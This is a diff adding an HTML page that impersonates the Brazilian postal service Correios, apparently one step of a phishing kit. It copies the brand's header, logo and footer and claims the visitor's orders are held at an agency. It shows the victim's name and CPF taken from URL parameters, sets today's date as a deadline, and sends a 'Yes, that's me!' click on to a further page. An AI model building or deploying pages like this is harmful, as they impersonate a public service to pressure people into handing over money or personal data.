@@ -1,0 +1,141 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Correios - Consulta</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="../css/bAhcrAfQuxfq.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Trebuchet MS', sans-serif;
+        }
+        .info-box {
+            background-color: #F0F4F8;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            text-align: left;
+        }
+        .btn-primary {
+            background-color: #1B73E8;
+            color: #fff;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.375rem;
+            display: inline-block;
+            margin-top: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-primary:hover {
+            background-color: #165bb5;
+        }
+        footer {
+            background-color: #FFE602; /* Amarelo do footer */
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-trebuchet">
+
+    <!-- Header -->
+    <header class="bg-correios-navbar border-b border-gray-200 p-4 shadow-md header-fixed">
+        <div class="max-w-6xl mx-auto flex justify-between items-center">
+            <button class="text-correios-menu-icon">
+                <img alt="Menu" class="w-10 h-10" src="images/AAQesYTinek9.svg">
+            </button>
+            <img alt="Correios logo" class="h-auto w-auto" src="images/wpKWSfrRPdYa.png" style="max-height: 40px; max-width: 200px;">
+            <div class="w-10">
+                <!-- Div vazia para balancear o layout -->
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="max-w-lg mx-auto mt-20 p-6 bg-white rounded-lg shadow-lg text-center">
+        <h1 id="main-header" class="text-xl font-bold text-correios-text mb-4">
+            <span id="nome-header">Nome Completo</span>, encontramos pedidos retidos em uma de nossas agências.
+        </h1>
+        <div class="info-box">
+            <p><strong>Nome Completo:</strong> <span id="nome-completo">Carregando...</span></p>
+            <p><strong>CPF:</strong> <span id="cpf">Carregando...</span></p>
+            <p><strong>Prazo para regularização:</strong> <span id="current-date"></span></p>
+        </div>
+        <p class="mt-6">Esse é você?</p>
+        <button class="btn-primary" onclick="redirecionarParaPagina03()">Sim, sou eu!</button>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="max-w-6xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div>
+                    <h2 class="text-2xl font-bold mb-4 text-correios-footer-text">Fale Conosco</h2>
+                    <ul class="text-correios-footer-text space-y-2">
+                        <li>Registro de manifestações</li>
+                        <li>Acompanhamento de manifestações</li>
+                        <li>Central de Atendimento</li>
+                        <li>Atendimento Comercial</li>
+                        <li>Ouvidoria</li>
+                        <li>Denúncia</li>
+                    </ul>
+                </div>
+                <div>
+                    <h2 class="text-2xl font-bold mb-4 text-correios-footer-text">Sobre os Correios</h2>
+                    <ul class="text-correios-footer-text space-y-2">
+                        <li>Educação e Cultura</li>
+                        <li>Código de Ética</li>
+                        <li>Venda de Imóveis</li>
+                    </ul>
+                </div>
+                <div>
+                    <h2 class="text-2xl font-bold mb-4 text-correios-footer-text">Outros Sites</h2>
+                    <ul class="text-correios-footer-text space-y-2">
+                        <li>Loja online dos Correios</li>
+                        <li>Ministério da Ciência, Tecnologia, Inovações e Comunicações</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="mt-8 border-t border-correios-footer-text pt-8 text-center">
+                <p class="text-sm text-correios-footer-text">
+                    © Copyright 2024 Correios - Todos os direitos reservados
+                </p>
+                <p class="text-xs text-correios-footer-text mt-2">v0.21.27</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Script para exibir a data atual
+        document.addEventListener("DOMContentLoaded", function () {
+            const today = new Date();
+            const options = { day: '2-digit', month: '2-digit', year: 'numeric' };
+            const currentDate = today.toLocaleDateString('pt-BR', options);
+            document.getElementById('current-date').textContent = currentDate;
+
+            // Pega os parâmetros da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const nome = urlParams.get('nome') || 'Nome Completo';
+            const cpf = urlParams.get('cpf') || '000.000.000-00';
+
+            // Preenche os campos com os dados recebidos
+            document.getElementById('nome-header').textContent = nome;
+            document.getElementById('nome-completo').textContent = nome;
+            document.getElementById('cpf').textContent = cpf;
+        });
+
+        // Função para redirecionar para a página 03
+        function redirecionarParaPagina03() {
+            const nomeCompleto = document.getElementById('nome-completo').textContent;
+            const cpf = document.getElementById('cpf').textContent;
+
+            // URL de redirecionamento com parâmetros codificados
+            const url = `/objeto`;
+
+            console.log('Redirecionando para:', url); // Log para depuração
+            window.location.href = url;
+        }
+    </script>
+</body>
+</html>
